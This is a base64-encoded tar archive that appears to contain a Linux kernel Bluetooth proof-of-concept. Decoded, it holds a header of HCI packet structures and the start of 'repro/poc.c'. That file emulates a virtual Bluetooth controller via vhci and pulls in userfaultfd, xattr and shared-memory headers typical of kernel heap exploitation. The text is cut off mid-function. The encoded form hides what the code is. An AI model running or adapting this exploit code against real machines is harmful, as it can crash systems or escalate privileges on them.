Lmg+CgojaW5jbHVkZSA8Ymx1ZXRvb3RoL2JsdWV0b290aC5oPgojaW5jbHVk
ZSA8Ymx1ZXRvb3RoL3Njby5oPgoKLy8gbWFjcm9zIGFuZCBzdHJ1Y3RzCiNp
Zm5kZWYgX1NZWktBTExfVVRJTAojZGVmaW5lIF9TWVpLQUxMX1VUSUwKI2Rl
ZmluZSBib29sIHVpbnQ4CiNkZWZpbmUgdHJ1ZSAxCiNkZWZpbmUgZmFsc2Ug
MAoKdHlwZWRlZiB1aW50OF90IHVpbnQ4Owp0eXBlZGVmIHVpbnQxNl90IHVp
bnQxNjsKdHlwZWRlZiB1aW50MzJfdCB1aW50MzI7CnR5cGVkZWYgdWludDY0
X3QgdWludDY0OwoKc3RydWN0IHNvY2thZGRyX2hjaSB7CiAgICAgICAgdW5z
aWduZWQgc2hvcnQgaGNpX2ZhbWlseTsKICAgICAgICB1bnNpZ25lZCBzaG9y
dCBoY2lfZGV2OwogICAgICAgIHVuc2lnbmVkIHNob3J0IGhjaV9jaGFubmVs
Owp9OwoKI2RlZmluZSBCVFBST1RPX0hDSSAxCiNkZWZpbmUgQUNMX0xJTksg
MQojZGVmaW5lIFNDQU5fUEFHRSAyCgovLyB0eXBlZGVmIHN0cnVjdCB7Ci8v
ICAgICAgICAgdWludDggYls2XTsKLy8gfSBfX2F0dHJpYnV0ZV9fKChwYWNr
ZWQpKSBiZGFkZHJfdDsKCiNkZWZpbmUgSENJX0NPTU1BTkRfUEtUIDEKI2Rl
ZmluZSBIQ0lfQUNMREFUQV9QS1QgMgojZGVmaW5lIEhDSV9TQ09EQVRBX1BL
VCAzCiNkZWZpbmUgSENJX0VWRU5UX1BLVCA0CiNkZWZpbmUgSENJX1ZFTkRP
Ul9QS1QgMHhmZgoKI2RlZmluZSBIQ0lfT1BfUkVTRVQgMHgwYzAzCiNkZWZp
bmUgSENJX09QX1NFVF9FVkVOVF9GTFQgMHgwYzA1CiNkZWZpbmUgSENJX09Q
X1dSSVRFX0NBX1RJTUVPVVQJCTB4MGMxNgoKc3RydWN0IGhjaV9jb21tYW5k
X2hkciB7CiAgICAgICAgdWludDE2IG9wY29kZTsKICAgICAgICB1aW50OCBw
bGVuOwp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKc3RydWN0IGhjaV9l
dmVudF9oZHIgewogICAgICAgIHVpbnQ4IGV2dDsKICAgICAgICB1aW50OCBw
bGVuOwp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmluZSBIQ0lf
RVZfQ09OTl9DT01QTEVURSAweDAzCnN0cnVjdCBoY2lfZXZfY29ubl9jb21w
bGV0ZSB7CiAgICAgICAgdWludDggc3RhdHVzOwogICAgICAgIHVpbnQxNiBo
YW5kbGU7CiAgICAgICAgYmRhZGRyX3QgYmRhZGRyOwogICAgICAgIHVpbnQ4
IGxpbmtfdHlwZTsKICAgICAgICB1aW50OCBlbmNyX21vZGU7Cn0gX19hdHRy
aWJ1dGVfXygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9PUF9SRUFEX0xPQ0FM
X1ZFUlNJT04gMHgxMDAxCnN0cnVjdCBoY2lfcnBfcmVhZF9sb2NhbF92ZXJz
aW9uIHsKICAgICAgICBfX3U4IHN0YXR1czsKICAgICAgICBfX3U4IGhjaV92
ZXI7CiAgICAgICAgX19sZTE2IGhjaV9yZXY7CiAgICAgICAgX191OCBsbXBf
dmVyOwogICAgICAgIF9fbGUxNiBtYW51ZmFjdHVyZXI7CiAgICAgICAgX19s
ZTE2IGxtcF9zdWJ2ZXI7Cn0gX19hdHRyaWJ1dGVfXygocGFja2VkKSk7Cgoj
ZGVmaW5lIEhDSV9PUF9MRV9SRUFEX0JVRkZFUl9TSVpFIDB4MjAwMgpzdHJ1
Y3QgaGNpX3JwX2xlX3JlYWRfYnVmZmVyX3NpemUgewogICAgICAgIF9fdTgg
c3RhdHVzOwogICAgICAgIF9fbGUxNiBsZV9tdHU7CiAgICAgICAgX191OCBs
ZV9tYXhfcGt0Owp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKc3RydWN0
IGhjaV9kZXZfcmVxIHsKICAgICAgICB1aW50MTYgZGV2X2lkOwogICAgICAg
IHVpbnQzMiBkZXZfb3B0Owp9OwoKc3RydWN0IHZoY2lfdmVuZG9yX3BrdCB7
CiAgICAgICAgdWludDggdHlwZTsKICAgICAgICB1aW50OCBvcGNvZGU7CiAg
ICAgICAgdWludDE2IGlkOwp9OwoKI2RlZmluZSBIQ0lfT1BfUkVBRF9DTEFT
U19PRl9ERVYgMHgwYzIzCnN0cnVjdCBoY2lfcnBfcmVhZF9jbGFzc19vZl9k
ZXYgewogICAgICAgIF9fdTggc3RhdHVzOwogICAgICAgIF9fdTggZGV2X2Ns
YXNzWzNdOwp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmluZSBI
Q0lfT1BfUkVBRF9MT0NBTF9GRUFUVVJFUyAweDEwMDMKc3RydWN0IGhjaV9y
cF9yZWFkX2xvY2FsX2ZlYXR1cmVzIHsKICAgICAgICBfX3U4IHN0YXR1czsK
ICAgICAgICBfX3U4IGZlYXR1cmVzWzhdOwp9IF9fYXR0cmlidXRlX18oKHBh
Y2tlZCkpOwoKI2RlZmluZSBIQ0lfT1BfUkVBRF9CRF9BRERSIDB4MTAwOQpz
dHJ1Y3QgaGNpX3JwX3JlYWRfYmRfYWRkciB7CiAgICAgICAgdWludDggc3Rh
dHVzOwogICAgICAgIGJkYWRkcl90IGJkYWRkcjsKfSBfX2F0dHJpYnV0ZV9f
KChwYWNrZWQpKTsKCiNkZWZpbmUgSENJX0VWX0xFX01FVEEgMHgzZQpzdHJ1
Y3QgaGNpX2V2X2xlX21ldGEgewogICAgICAgIHVpbnQ4IHN1YmV2ZW50Owp9
IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmluZSBIQ0lfRVZfTEVf
Q09OTl9DT01QTEVURSAweDAxCnN0cnVjdCBoY2lfZXZfbGVfY29ubl9jb21w
bGV0ZSB7CiAgICAgICAgdWludDggc3RhdHVzOwogICAgICAgIHVpbnQxNiBo
YW5kbGU7CiAgICAgICAgdWludDggcm9sZTsKICAgICAgICB1aW50OCBiZGFk
ZHJfdHlwZTsKICAgICAgICBiZGFkZHJfdCBiZGFkZHI7CiAgICAgICAgdWlu
dDE2IGludGVydmFsOwogICAgICAgIHVpbnQxNiBsYXRlbmN5OwogICAgICAg
IHVpbnQxNiBzdXBlcnZpc2lvbl90aW1lb3V0OwogICAgICAgIHVpbnQ4IGNs
a19hY2N1cmFuY3k7Cn0gX19hdHRyaWJ1dGVfXygocGFja2VkKSk7CgojZGVm
aW5lIEhDSV9FVl9DT05OX1JFUVVFU1QgMHgwNApzdHJ1Y3QgaGNpX2V2X2Nv
bm5fcmVxdWVzdCB7CiAgICAgICAgYmRhZGRyX3QgYmRhZGRyOwogICAgICAg
IHVpbnQ4IGRldl9jbGFzc1szXTsKICAgICAgICB1aW50OCBsaW5rX3R5cGU7
Cn0gX19hdHRyaWJ1dGVfXygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9FVl9S
RU1PVEVfRkVBVFVSRVMgMHgwYgpzdHJ1Y3QgaGNpX2V2X3JlbW90ZV9mZWF0
dXJlcyB7CiAgICAgICAgdWludDggc3RhdHVzOwogICAgICAgIHVpbnQxNiBo
YW5kbGU7CiAgICAgICAgdWludDggZmVhdHVyZXNbOF07Cn0gX19hdHRyaWJ1
dGVfXygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9FVl9DTURfQ09NUExFVEUg
MHgwZQpzdHJ1Y3QgaGNpX2V2X2NtZF9jb21wbGV0ZSB7CiAgICAgICAgdWlu
dDggbmNtZDsKICAgICAgICB1aW50MTYgb3Bjb2RlOwp9IF9fYXR0cmlidXRl
X18oKHBhY2tlZCkpOwoKI2RlZmluZSBIQ0lfT1BfV1JJVEVfU0NBTl9FTkFC
TEUgMHgwYzFhCgojZGVmaW5lIEhDSV9PUF9SRUFEX0JVRkZFUl9TSVpFIDB4
MTAwNQpzdHJ1Y3QgaGNpX3JwX3JlYWRfYnVmZmVyX3NpemUgewogICAgICAg
IHVpbnQ4IHN0YXR1czsKICAgICAgICB1aW50MTYgYWNsX210dTsKICAgICAg
ICB1aW50OCBzY29fbXR1OwogICAgICAgIHVpbnQxNiBhY2xfbWF4X3BrdDsK
ICAgICAgICB1aW50MTYgc2NvX21heF9wa3Q7Cn0gX19hdHRyaWJ1dGVfXygo
cGFja2VkKSk7CgojZGVmaW5lIEhDSV9NQVhfTkFNRV9MRU5HVEgJCTI0OAoj
ZGVmaW5lIEhDSV9NQVhfTkFNRV9MRU5HVEhfQlVHICAgICAgICAgMTYKI2Rl
ZmluZSBIQ0lfT1BfUkVBRF9MT0NBTF9OQU1FIDB4MGMxNApzdHJ1Y3QgaGNp
X3JwX3JlYWRfbG9jYWxfbmFtZSB7Cgl1aW50OCAgICAgc3RhdHVzOwoJdWlu
dDggICAgIG5hbWVbSENJX01BWF9OQU1FX0xFTkdUSF07Cn0gX19hdHRyaWJ1
dGVfXygocGFja2VkKSk7CgpzdHJ1Y3QgaGNpX3JwX3JlYWRfbG9jYWxfbmFt
ZV9idWcgewogICAgICAgIHVpbnQ4ICAgICBzdGF0dXM7CiAgICAgICAgdWlu
dDggICAgIG5hbWVbSENJX01BWF9OQU1FX0xFTkdUSF9CVUddOwp9IF9fYXR0
cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmluZSBIQ0lfT1BfQ1JFQVRFX0NP
Tk4JCTB4MDQwNQpzdHJ1Y3QgaGNpX2NwX2NyZWF0ZV9jb25uIHsKCWJkYWRk
cl90ICAgICAgICBiZGFkZHI7Cgl1aW50MTZfdCAgICAgICAgcGt0X3R5cGU7
Cgl1aW50OCAgICAgICAgICAgcHNjYW5fcmVwX21vZGU7Cgl1aW50OCAgICAg
ICAgICAgcHNjYW5fbW9kZTsKCXVpbnQxNl90ICAgICAgICBjbG9ja19vZmZz
ZXQ7Cgl1aW50OCAgICAgICAgICAgcm9sZV9zd2l0Y2g7Cn0gX19hdHRyaWJ1
dGVfXygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9PUF9SRUFEX1JFTU9URV9G
RUFUVVJFUwkweDA0MWIKc3RydWN0IGhjaV9jcF9yZWFkX3JlbW90ZV9mZWF0
dXJlcyB7Cgl1aW50MTZfdCAgIGhhbmRsZTsKfSBfX2F0dHJpYnV0ZV9fKChw
YWNrZWQpKTsKCiNkZWZpbmUgSENJX09QX1NFVFVQX1NZTkNfQ09OTgkJMHgw
NDI4CnN0cnVjdCBoY2lfY3Bfc2V0dXBfc3luY19jb25uIHsKCXVpbnQxNl90
ICAgaGFuZGxlOwoJdWludDMyX3QgICB0eF9iYW5kd2lkdGg7Cgl1aW50MzJf
dCAgIHJ4X2JhbmR3aWR0aDsKCXVpbnQxNl90ICAgbWF4X2xhdGVuY3k7Cgl1
aW50MTZfdCAgIHZvaWNlX3NldHRpbmc7Cgl1aW50OF90ICAgICByZXRyYW5z
X2VmZm9ydDsKCXVpbnQxNl90ICAgcGt0X3R5cGU7Cn0gX19hdHRyaWJ1dGVf
XygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9PUF9SRUFEX1JFTU9URV9FWFRf
RkVBVFVSRVMJMHgwNDFjCnN0cnVjdCBoY2lfY3BfcmVhZF9yZW1vdGVfZXh0
X2ZlYXR1cmVzIHsKCXVpbnQxNl90ICAgaGFuZGxlOwoJdWludDhfdCAgICAg
cGFnZTsKfSBfX2F0dHJpYnV0ZV9fKChwYWNrZWQpKTsKCiNkZWZpbmUgSENJ
X0VWX1JFTU9URV9FWFRfRkVBVFVSRVMJMHgyMwpzdHJ1Y3QgaGNpX2V2X3Jl
bW90ZV9leHRfZmVhdHVyZXMgewoJdWludDhfdCAgICAgc3RhdHVzOwoJdWlu
dDE2X3QgICBoYW5kbGU7Cgl1aW50OF90ICAgICBwYWdlOwoJdWludDhfdCAg
ICAgbWF4X3BhZ2U7Cgl1aW50OF90ICAgICBmZWF0dXJlc1s4XTsKfSBfX2F0
dHJpYnV0ZV9fKChwYWNrZWQpKTsKCiNkZWZpbmUgSENJX09QX1JFTU9URV9O
QU1FX1JFUQkJMHgwNDE5CnN0cnVjdCBoY2lfY3BfcmVtb3RlX25hbWVfcmVx
IHsKCWJkYWRkcl90IGJkYWRkcjsKCXVpbnQ4X3QgICAgIHBzY2FuX3JlcF9t
b2RlOwoJdWludDhfdCAgICAgcHNjYW5fbW9kZTsKCXVpbnQxNl90ICAgY2xv
Y2tfb2Zmc2V0Owp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmlu
ZSBIQ0lfRVZfUkVNT1RFX05BTUUJCTB4MDcKc3RydWN0IGhjaV9ldl9yZW1v
dGVfbmFtZSB7Cgl1aW50OF90ICAgICBzdGF0dXM7CgliZGFkZHJfdCBiZGFk
ZHI7Cgl1aW50OF90ICAgICBuYW1lW0hDSV9NQVhfTkFNRV9MRU5HVEhdOwp9
IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmluZSBIQ0lfRVZfQ01E
X1NUQVRVUwkJMHgwZgpzdHJ1Y3QgaGNpX2V2X2NtZF9zdGF0dXMgewoJdWlu
dDhfdCAgICAgc3RhdHVzOwoJdWludDhfdCAgICAgbmNtZDsKCXVpbnQxNl90
ICAgIG9wY29kZTsKfSBfX2F0dHJpYnV0ZV9fKChwYWNrZWQpKTsKCiNkZWZp
bmUgSENJX0VWX1NZTkNfQ09OTl9DT01QTEVURQkweDJjCnN0cnVjdCBoY2lf
ZXZfc3luY19jb25uX2NvbXBsZXRlIHsKCXVpbnQ4X3QgICAgIHN0YXR1czsK
CXVpbnQxNl90ICAgaGFuZGxlOwoJYmRhZGRyX3QgYmRhZGRyOwoJdWludDhf
dCAgICAgbGlua190eXBlOwoJdWludDhfdCAgICAgdHhfaW50ZXJ2YWw7Cgl1
aW50OF90ICAgICByZXRyYW5zX3dpbmRvdzsKCXVpbnQxNl90ICAgcnhfcGt0
X2xlbjsKCXVpbnQxNl90ICAgdHhfcGt0X2xlbjsKCXVpbnQ4X3QgICAgIGFp
cl9tb2RlOwp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2RlZmluZSBI
Q0lfT1BfQUREX1NDTwkJCTB4MDQwNwpzdHJ1Y3QgaGNpX2NwX2FkZF9zY28g
ewoJdWludDE2X3QgICBoYW5kbGU7Cgl1aW50MTZfdCAgIHBrdF90eXBlOwp9
IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKc3RydWN0IHZwYXJhbSB7Cglp
bnQgZmQ7CglpbnQgc29jazsKCXVpbnQxNiBpZDsKfTsKCiNkZWZpbmUgSENJ
REVWVVAgX0lPVygnSCcsIDIwMSwgaW50KQojZGVmaW5lIEhDSVNFVFNDQU4g
X0lPVygnSCcsIDIyMSwgaW50KQojZGVmaW5lIEhDSUlOUVVJUlkJX0lPUign
SCcsIDI0MCwgaW50KQoKI2RlZmluZSBmYWlsKHgpIHBlcnJvcih4KSxleGl0
KDEpCi8vIGZ1bmN0aW9ucwp2b2lkIGhjaV9zZW5kX2V2ZW50X2NtZF9jb21w
bGV0ZShpbnQgZmQsIHVpbnQxNiBvcGNvZGUsIHZvaWQqIGRhdGEsIHNpemVf
dCBkYXRhX2xlbik7CnZvaWQgaGNpX3NlbmRfZXZlbnRfcGFja2V0KGludCBm
ZCwgdWludDggZXZ0LCB2b2lkKiBkYXRhLCBzaXplX3QgZGF0YV9sZW4pOwpz
dHJ1Y3QgdnBhcmFtIGluaXRpYWxpemVfdmhjaSgpOwoKI2VuZGlmCgAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJlcHJvL3Bv
Yy5jAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAwMDAwNjY0ADAwMDE3NTAAMDAwMTc1MAAwMDAwMDAzMzA2MgAxNDA3MTUy
NzI1MAAwMTEyNzEAIDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXN0YXIgIABsaW4AAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAGxpbgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIu
aD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPGJsdWV0b290
aC9ibHVldG9vdGguaD4KI2luY2x1ZGUgPGJsdWV0b290aC9zY28uaD4KI2lu
Y2x1ZGUgPHN0ZGludC5oPgoKI2luY2x1ZGUgPHN5cy94YXR0ci5oPgojaW5j
bHVkZSA8c3lzL2lwYy5oPgojaW5jbHVkZSA8c3lzL3NobS5oPgojaW5jbHVk
ZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVk
ZSA8bGludXgvdXNlcmZhdWx0ZmQuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5o
PgojaW5jbHVkZSA8cHRocmVhZC5oPgojaW5jbHVkZSA8ZXJybm8uaD4KI2lu
Y2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUg
PHNpZ25hbC5oPgojaW5jbHVkZSA8cG9sbC5oPgojaW5jbHVkZSA8c3RyaW5n
Lmg+CiNpbmNsdWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8c3lzL3N5c2Nh
bGwuaD4KI2luY2x1ZGUgPHN5cy9pb2N0bC5oPgojaW5jbHVkZSA8cG9sbC5o
PgojaW5jbHVkZSA8c3RkaW50Lmg+CgojaW5jbHVkZSAic3l6a2FsbGVyX3V0
aWxzLmgiCgpzdGF0aWMgaW50IHBhZ2Vfc2l6ZTsKaW50IGZkOwppbnQgcHJv
Y2ZkOwoKc3RydWN0IHZwYXJhbSB2cDsKCiNkZWZpbmUgZXJyRXhpdChzKSBk
byB7IHBlcnJvcihzKTsgZXhpdCgtMSk7IH0gd2hpbGUoMCk7Cgp2b2lkIGR1
bXBfaGV4KGNoYXIqIGJ1ZiwgaW50IGxlbikKewogICAgcHJpbnRmKCItLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS1cbiIpOwogICAgaW50IFNURVAgPSAxNjsKICAgIGludCBDVVJTT1IgPSAw
OwogICAgZm9yKDsgbGVuID4gMDsgbGVuIC09IFNURVApIHsKICAgICAgICBm
b3IoaW50IGkgPSAwOyBpIDwgU1RFUCAmJiBpIDwgbGVuOyBpKyspIHsKICAg
ICAgICAgICAgcHJpbnRmKCIlMDJ4ICIsIGJ1ZltDVVJTT1IrK10gJiAweGZm
KTsKICAgICAgICB9CiAgICAgICAgcHJpbnRmKCJcbiIpOwogICAgfQogICAg
cHJpbnRmKCJcbiIpOwp9Cgp2b2lkIGR1bXBfY21kX2RhdGEoY2hhciogYnVm
LCBpbnQgbGVuKQp7CiAgICBzdHJ1Y3QgaGNpX2NvbW1hbmRfaGRyKiBwID0g
YnVmICsgMTsKICAgIHByaW50ZigiW0RVTVBdIGNvbW1hbmQgb3Bjb2RlOiAl
eFxuIiwgcC0+b3Bjb2RlKTsKICAgIGR1bXBfaGV4KGJ1ZiwgbGVuKTsKfQoK
dm9pZCByZXBseV93cmFwcGVyKGludCBmZCwgY2hhciogYnVmLCBzc2l6ZV90
IGJ1Zl9zaXplKQp7CiAgICAvLyBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIik7CiAgICAv
LyBzdHJ1Y3QgaGNpX2NvbW1hbmRfaGRyKiBwID0gYnVmICsgMTsKICAgIC8v
IHByaW50ZigiW0RVTVBdIHJlcGx5OiAleFxuIiwgcC0+b3Bjb2RlKTsKICAg
IC8vIGludCBTVEVQID0gMTY7CiAgICAvLyBpbnQgQ1VSU09SID0gMDsKICAg
IC8vIGZvcig7IGJ1Zl9zaXplID4gMDsgYnVmX3NpemUgLT0gU1RFUCkgewog
ICAgLy8gICAgIGZvcihpbnQgaSA9IDA7IGkgPCBTVEVQICYmIGkgPCBidWZf
c2l6ZTsgaSsrKSB7CiAgICAvLyAgICAgICAgIHByaW50ZigiJTAyeCAiLCBi
dWZbQ1VSU09SKytdICYgMHhmZik7CiAgICAvLyAgICAgfQogICAgLy8gICAg
IHByaW50ZigiXG4iKTsKICAgIC8vIH0KICAgIGlmICh3cml0ZShmZCwgYnVm
LCBidWZfc2l6ZSkgPCAwKSBlcnJFeGl0KCJ3cml0ZSB3cmFwcGVyIik7Cn0K
CnN0YXRpYyBib29sIHNjb19wcm9jZXNzX2NvbW1hbmRfcGt0KGludCBmZCwg
Y2hhciogYnVmLCBzc2l6ZV90IGJ1Zl9zaXplKQp7CiAgICBzdHJ1Y3QgaGNp
X2NvbW1hbmRfaGRyKiBoZHIgPSAoc3RydWN0IGhjaV9jb21tYW5kX2hkciop
YnVmOwogICAgaWYgKGJ1Zl9zaXplIDwgKHNzaXplX3Qpc2l6ZW9mKHN0cnVj
dCBoY2lfY29tbWFuZF9oZHIpIHx8CiAgICAgICAgaGRyLT5wbGVuICE9IGJ1
Zl9zaXplIC0gc2l6ZW9mKHN0cnVjdCBoY2lfY29tbWFuZF9oZHIpKSB7CiAg
ICAgICAgICAgIGVyckV4aXQoIm1hbGZvcm1lZCBwa3QiKTsKICAgIH0KCiAg
ICBjaGFyIHJlcGx5WzEwMjRdID0gezB9OwogICAgc3dpdGNoIChoZHItPm9w
Y29kZSkgewogICAgICAgIGNhc2UgSENJX09QX0NSRUFURV9DT05OOiB7CiAg
ICAgICAgICAgIC8vIENvbW1hbmQgU3RhdHVzCiAgICAgICAgICAgIHJlcGx5
WzBdID0gSENJX0VWRU5UX1BLVDsKICAgICAgICAgICAgc3RydWN0IGhjaV9l
dmVudF9oZHIqIF9oZHIgPSByZXBseSArIDE7CiAgICAgICAgICAgIF9oZHIt
PmV2dCA9IEhDSV9FVl9DTURfU1RBVFVTOyAvLyBldnQ7CiAgICAgICAgICAg
IF9oZHItPnBsZW4gPSAweDQ7Ly8gcGxlbjsKICAgICAgICAgICAgc3RydWN0
IGhjaV9ldl9jbWRfc3RhdHVzKiBzdGF0dXMgPSByZXBseSArIDM7CiAgICAg
ICAgICAgIHN0YXR1cy0+bmNtZCA9IDB4MDE7CiAgICAgICAgICAgIHN0YXR1
cy0+b3Bjb2RlID0gSENJX09QX0NSRUFURV9DT05OOwogICAgICAgICAgICBz
dGF0dXMtPnN0YXR1cyA9IDB4MDsKICAgICAgICAgICAgcmVwbHlfd3JhcHBl
cihmZCwgcmVwbHksIDcpOwoKICAgICAgICAgICAgLy8gQ29ubmVjdCBDb21w
bGV0ZQogICAgICAgICAgICBtZW1zZXQocmVwbHksIDAsIHNpemVvZihyZXBs
eSkpOwogICAgICAgICAgICByZXBseVswXSA9IEhDSV9FVkVOVF9QS1Q7CiAg
ICAgICAgICAgIHN0cnVjdCBoY2lfZXZlbnRfaGRyKiBoZHIgPSByZXBseSAr
IDE7CiAgICAgICAgICAgIGhkci0+ZXZ0ID0gSENJX0VWX0NPTk5fQ09NUExF
VEU7CiAgICAgICAgICAgIGhkci0+cGxlbiA9IDExOwogICAgICAgICAgICBz
dHJ1Y3QgaGNpX2V2X2Nvbm5fY29tcGxldGUqIGNtcCA9IHJlcGx5ICsgMzsK
ICAgICAgICAgICAgY21wLT5zdGF0dXMgPSAweDA7CiAgICAgICAgICAgIGNt
cC0+aGFuZGxlID0gMHg0YTsKICAgICAgICAgICAgY21wLT5saW5rX3R5cGUg
PSAweDE7IC8vIEFDTDsKICAgICAgICAgICAgY21wLT5lbmNyX21vZGUgPSAw
eDA7CiAgICAgICAgICAgIG1lbXNldCgmY21wLT5iZGFkZHIsIDB4YmIsIDYp
OwogICAgICAgICAgICByZXBseV93cmFwcGVyKGZkLCByZXBseSwgMTQpOwog
ICAgICAgICAgICAvLyB3aGF0IEFDTCBkYXRhID8/PwogICAgICAgICAgICBy
ZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGNhc2UgSENJX09QX1JF
QURfUkVNT1RFX0ZFQVRVUkVTOiB7CiAgICAgICAgICAgIC8vIENvbW1hbmQg
U3RhdHVzCiAgICAgICAgICAgIHJlcGx5WzBdID0gSENJX0VWRU5UX1BLVDsK
ICAgICAgICAgICAgc3RydWN0IGhjaV9ldmVudF9oZHIqIF9oZHIgPSByZXBs
eSArIDE7CiAgICAgICAgICAgIF9oZHItPmV2dCA9IEhDSV9FVl9DTURfU1RB
VFVTOyAvLyBldnQ7CiAgICAgICAgICAgIF9oZHItPnBsZW4gPSAweDQ7Ly8g
cGxlbjsKICAgICAgICAgICAgc3RydWN0IGhjaV9ldl9jbWRfc3RhdHVzKiBz
dGF0dXMgPSByZXBseSArIDM7CiAgICAgICAgICAgIHN0YXR1cy0+bmNtZCA9
IDB4MDE7CiAgICAgICAgICAgIHN0YXR1cy0+b3Bjb2RlID0gSENJX09QX1JF
QURfUkVNT1RFX0ZFQVRVUkVTOwogICAgICAgICAgICBzdGF0dXMtPnN0YXR1
cyA9IDB4MDsKICAgICAgICAgICAgcmVwbHlfd3JhcHBlcihmZCwgcmVwbHks
IDcpOwoKICAgICAgICAgICAgLy8gSENJX0VWX1JFTU9URV9GRUFUVVJFUwog
ICAgICAgICAgICBtZW1zZXQocmVwbHksIDAsIHNpemVvZihyZXBseSkpOwog
ICAgICAgICAgICByZXBseVswXSA9IEhDSV9FVkVOVF9QS1Q7CiAgICAgICAg
ICAgIF9oZHIgPSByZXBseSArIDE7CiAgICAgICAgICAgIF9oZHItPmV2dCA9
IEhDSV9FVl9SRU1PVEVfRkVBVFVSRVM7CiAgICAgICAgICAgIF9oZHItPnBs
ZW4gPSAxMTsKICAgICAgICAgICAgc3RydWN0IGhjaV9ldl9yZW1vdGVfZmVh
dHVyZXMqIGZlYXQgPSByZXBseSArIDM7CiAgICAgICAgICAgIGZlYXQtPnN0
YXR1cyA9IDB4MDsKICAgICAgICAgICAgZmVhdC0+aGFuZGxlID0gMHg0YTsK
ICAgICAgICAgICAgbWVtc2V0KCZmZWF0LT5mZWF0dXJlcywgIlx4YTRceDA4
XHgwMFx4YzBceDE4XHgxZVx4NzlceDgzIiwgOCk7CiAgICAgICAgICAgIHJl
cGx5X3dyYXBwZXIoZmQsIHJlcGx5LCAxNCk7CiAgICAgICAgICAgIHJldHVy
biBmYWxzZTsKICAgICAgICB9CiAgICAgICAgY2FzZSBIQ0lfT1BfU0VUVVBf
U1lOQ19DT05OOiB7CiAgICAgICAgICAgIC8vIENvbW1hbmQgU3RhdHVzCiAg
ICAgICAgICAgIHJlcGx5WzBdID0gSENJX0VWRU5UX1BLVDsKICAgICAgICAg
ICAgc3RydWN0IGhjaV9ldmVudF9oZHIqIF9oZHIgPSByZXBseSArIDE7CiAg
ICAgICAgICAgIF9oZHItPmV2dCA9IEhDSV9FVl9DTURfU1RBVFVTOyAvLyBl
dnQ7CiAgICAgICAgICAgIF9oZHItPnBsZW4gPSAweDQ7Ly8gcGxlbjsKICAg
ICAgICAgICAgc3RydWN0IGhjaV9ldl9jbWRfc3RhdHVzKiBzdGF0dXMgPSBy
ZXBseSArIDM7CiAgICAgICAgICAgIHN0YXR1cy0+bmNtZCA9IDB4MDE7CiAg
ICAgICAgICAgIHN0YXR1cy0+b3Bjb2RlID0gSENJX09QX1NFVFVQX1NZTkNf
Q09OTjsKICAgICAgICAgICAgc3RhdHVzLT5zdGF0dXMgPSAweDA7CiAgICAg
ICAgICAgIHJlcGx5X3dyYXBwZXIoZmQsIHJlcGx5LCA3KTsKCiAgICAgICAg
ICAgIC8vIFN5bmNocm9ub3VzIENvbm5lY3QgQ29tcGxldGUKICAgICAgICAg
ICAgbWVtc2V0KHJlcGx5LCAwLCBzaXplb2YocmVwbHkpKTsKICAgICAgICAg
ICAgcmVwbHlbMF0gPSBIQ0lfRVZFTlRfUEtUOwogICAgICAgICAgICBfaGRy
ID0gcmVwbHkgKyAxOwogICAgICAgICAgICBfaGRyLT5ldnQgPSBIQ0lfRVZf
